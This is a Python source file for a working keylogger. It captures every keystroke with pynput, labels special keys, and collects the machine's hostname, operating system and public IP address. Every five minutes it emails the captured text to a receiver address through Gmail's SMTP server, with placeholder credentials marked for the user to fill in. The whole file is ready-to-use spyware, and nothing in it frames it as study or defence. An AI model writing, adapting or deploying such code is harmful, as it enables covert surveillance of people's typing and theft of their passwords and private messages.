from pynput import keyboard
from email.mime.text import MIMEText
from socket import gethostbyname, gethostname
from platform import system
from requests import get
import time
import smtplib

def key_pressed(key):
    global log_data
    if hasattr(key, 'char'):
        log_data += key.char
    else:
        log_data += key_names.get(key, '<unknown key>')

key_names = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '<ENTER>',
    keyboard.Key.backspace: '<BACKSPACE>',
    keyboard.Key.esc: '<ESC>',
    keyboard.Key['f1']: '<F1>',
    keyboard.Key['f2']: '<F2>',
    keyboard.Key['f3']: '<F3>',
    keyboard.Key['f4']: '<F4>',
    keyboard.Key['f5']: '<F5>',
    keyboard.Key['f6']: '<F6>',
    keyboard.Key['f7']: '<F7>',
    keyboard.Key['f8']: '<F8>',
    keyboard.Key['f9']: '<F9>',
    keyboard.Key['f10']: '<F10>',
    keyboard.Key['f11']: '<F11>',
    keyboard.Key['f12']: '<F12>',
    keyboard.Key.shift: '<LSHIFT>',
    keyboard.Key.shift_r: '<RSHIFT>',
    keyboard.Key.ctrl: '<CTRL>',
    keyboard.Key.ctrl_l: '<LCTRL>',
    keyboard.Key.ctrl_r: '<RCTRL>',
    keyboard.Key.alt: '<ALT>',
    keyboard.Key.alt_l: '<LALT>',
    keyboard.Key.alt_r: '<RALT>',
    keyboard.Key.alt_gr: '<ALTGR>',
    keyboard.Key.caps_lock: '<CAPS>',
    keyboard.Key.cmd: '<CMD>',
    keyboard.Key.up: '<UP>',
    keyboard.Key.down: '<DOWN>',
    keyboard.Key.left: '<LEFT>',
    keyboard.Key.right: '<RIGHT>',
    keyboard.Key.insert: '<INSERT>',
    keyboard.Key.home: '<HOME>',
    keyboard.Key.page_up: '<PgUp>',
    keyboard.Key.page_down: '<PgDn>',
    keyboard.Key.delete: '<DEL>',
    keyboard.Key.end: '<END>',
    keyboard.Key.print_screen: '<PrntScr>',
    keyboard.Key.scroll_lock: '<ScrLk>',
    keyboard.Key.pause: '<PAUSE>',
    keyboard.Key.num_lock: '<NumLk>',
    keyboard.Key.tab: '<TAB>',
}

hostname = gethostname()
try:
    ip = get("https://ipinfo.io/ip").text
except:
    ip = gethostbyname(hostname)
os = system()

log_data = ''
last_print = time.time()

def send_email_with_keys(keys):
    sender_email = "senderGmailHere@gmail.com" #TODO: Change
    receiver_email = "receiverEmailHere@foo.com" #TODO: Change
    password = "gmailAppPasswHere" #TODO: Change
    
    message = MIMEText(keys)
    subject = f"Keylogger info from: {os} {hostname} ({ip})"
    content = keys
    message['subject'] = subject
    message['from'] = sender_email
    message['to'] = receiver_email
    
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, password)
    server.send_message(message)
    server.quit()

def send_logged_keys():
    global log_data
    if log_data:
        logged_keys = f"Logged keys: {log_data}"
        log_data = ""
        send_email_with_keys(logged_keys)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    while True:
        time.sleep(300) #Wait 5 minutes (300 seconds) before sending email, you can change that if you want.
        send_logged_keys()
